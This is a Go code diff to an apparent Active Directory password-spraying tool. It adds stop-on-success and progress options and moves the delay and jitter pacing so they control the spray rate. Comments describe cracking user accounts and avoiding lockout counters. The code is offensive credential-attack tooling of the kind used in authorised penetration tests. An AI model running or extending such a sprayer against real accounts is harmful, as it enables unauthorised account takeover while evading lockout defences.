@@ -31,11 +31,13 @@ type Options struct {
 	Domain            string
 	Timeout           int
 	Concurrency       int
-	Delay             time.Duration // per-attempt delay within a round
-	Jitter            time.Duration // extra random delay per attempt
-	RoundDelay        time.Duration // pause between password rounds
-	ContinueOnSuccess bool          // keep spraying users whose password was already found
-	OnHit             func(Hit)     // optional live callback for each valid credential
+	Delay             time.Duration                           // per-attempt delay within a round
+	Jitter            time.Duration                           // extra random delay per attempt
+	RoundDelay        time.Duration                           // pause between password rounds
+	ContinueOnSuccess bool                                    // keep spraying users whose password was already found
+	StopOnSuccess     bool                                    // stop the whole spray after the first valid credential
+	OnHit             func(Hit)                               // optional live callback for each valid credential
+	OnRoundStart      func(round, total int, password string) // optional per-round progress
 }
 
 // Hit is a valid credential discovered during spraying.
@@ -63,30 +65,54 @@ func Run(opts Options) *Result {
 
 	res := &Result{}
 	found := make(map[string]bool) // users already cracked, skipped in later rounds
+	stop := false                  // set once a hit is found and StopOnSuccess is on
 	var mu sync.Mutex
 
 	for i, password := range opts.Passwords {
+		mu.Lock()
+		halted := stop
+		mu.Unlock()
+		if halted {
+			break
+		}
+		if opts.OnRoundStart != nil {
+			opts.OnRoundStart(i+1, len(opts.Passwords), password)
+		}
+
 		sem := make(chan struct{}, opts.Concurrency)
 		var wg sync.WaitGroup
 
 		for _, user := range opts.Users {
 			mu.Lock()
-			skip := found[user] && !opts.ContinueOnSuccess
+			skip := stop || (found[user] && !opts.ContinueOnSuccess)
 			mu.Unlock()
 			if skip {
 				continue
 			}
 
-			wg.Add(1)
+			// Pace the launches: this delay/jitter is the actual spray rate
+			// limit, independent of concurrency (concurrency only caps how many
+			// attempts are in flight at once).
+			if opts.Delay > 0 {
+				time.Sleep(opts.Delay)
+			}
+			jitterSleep(opts.Jitter)
+
+			// Acquire a slot, then re-check stop: draining to a free slot means
+			// earlier attempts have finished, so a stop-on-success hit is visible.
 			sem <- struct{}{}
+			mu.Lock()
+			halted = stop
+			mu.Unlock()
+			if halted {
+				<-sem
+				break
+			}
+
+			wg.Add(1)
 			go func(user, password string) {
 				defer wg.Done()
 				defer func() { <-sem }()
-
-				if opts.Delay > 0 {
-					time.Sleep(opts.Delay)
-				}
-				jitterSleep(opts.Jitter)
 
 				// One credential is tried against a single responsive target
 				// (DCs share the directory) to avoid multiplying lockout counters.
@@ -107,6 +133,9 @@ func Run(opts Options) *Result {
 						if opts.OnHit != nil {
 							opts.OnHit(hit)
 						}
+						if opts.StopOnSuccess {
+							stop = true
+						}
 					}
 					mu.Unlock()
 					break // definitive answer from this target
@@ -115,7 +144,10 @@ func Run(opts Options) *Result {
 		}
 		wg.Wait()
 
-		if opts.RoundDelay > 0 && i < len(opts.Passwords)-1 {
+		mu.Lock()
+		halted = stop
+		mu.Unlock()
+		if opts.RoundDelay > 0 && i < len(opts.Passwords)-1 && !halted {
 			time.Sleep(opts.RoundDelay)
 		}
 	}
